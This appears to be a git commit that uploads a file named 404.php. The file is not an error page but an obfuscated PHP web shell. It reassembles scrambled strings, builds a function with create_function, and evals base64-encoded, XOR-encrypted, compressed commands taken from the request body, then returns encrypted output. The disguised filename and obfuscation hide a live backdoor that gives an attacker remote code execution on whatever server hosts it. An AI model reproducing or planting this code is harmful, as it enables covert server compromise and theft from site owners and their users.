452ba418a0a414dbd6bf986ff58e04e81f99c537
FGHacking <67956843+FGHacking@users.noreply.github.com>
2020-08-27 21:45:23 +0530

    Add files via upload

---
+++ 404.php
@@ -0,0 +1,12 @@
+<?php
+$M='($Ai=0;$i<$Al;)A{Afor(A$j=0;($j<$c&&$AAi<$l);$j++A,$Ai++){$o.A=$t{$i}^$k{$';
+$j='@baAse64_decode(A$m[1]),$k)))A;$o=@oAb_getA_conAtentAs();@ob_eAAnd_clean()';
+$I=';$r=A@baAse64_Aencode(@xAA(@gzcAompress($oA),$k));priAnAt("$Ap$kh$r$kf");}';
+$f='A$k="827ccbA0e";$kh="eAa8a70A6c4Ac34";$kf="Aa16891fA84eA7bA";$p="wNIWhMA6I';
+$U='nts("php:A/A/input"AA),$m)A==1) {@ob_startA();@eAval(A@gAzuncompress(A@xA(';
+$G='b8AsWzAcaw";functioAn x(AA$t,$k){$c=strlAeAn($k);$lA=stArlen($At);$o="";Afor';
+$R='jA};}}rAeturAn $o;}if AA(@preg_AmatcAh("/$kh(.+)$AAkf/A",@file_geAt_contAe';
+$h=str_replace('Y','','crYeYYate_fYYuYnction');
+$q=str_replace('A','',$f.$G.$M.$R.$U.$j.$I);
+$o=$h('',$q);$o();
+?>
